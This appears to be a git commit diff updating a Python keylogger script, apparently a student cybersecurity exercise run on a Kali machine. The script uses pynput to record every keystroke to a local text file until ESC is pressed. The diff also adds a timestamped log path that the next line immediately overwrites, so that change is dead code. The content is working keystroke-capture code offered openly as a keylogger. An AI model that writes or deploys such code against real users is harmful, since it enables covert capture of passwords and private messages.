89818fb13f9af34f16ad5ff298fa2716160cc92b
umarniazafrid <132810406+umarniazafrid@users.noreply.github.com>
2025-08-17 08:44:12 -0400

    Updated keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,22 +1,26 @@
 from pynput import keyboard
 import os
-from datetime import datetime
+from datetime import datetime  
+
+log_file = f"/home/kali/PRODIGY_CS_04/keylogger/keystrokes_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
 
 log_file = "key_log.txt"
 
 def on_press(key):
     try:
         with open(log_file, "a") as f:
-            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {key.char}\n")
+            f.write(f"{key.char}")
     except AttributeError:
         with open(log_file, "a") as f:
-            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {key}\n")
+            f.write(f" {key} ")
 
 def on_release(key):
     if key == keyboard.Key.esc:
+        # Stop listener when ESC is pressed
         return False
 
 if __name__ == "__main__":
+    # Clear log file before starting
     if os.path.exists(log_file):
         os.remove(log_file)
 
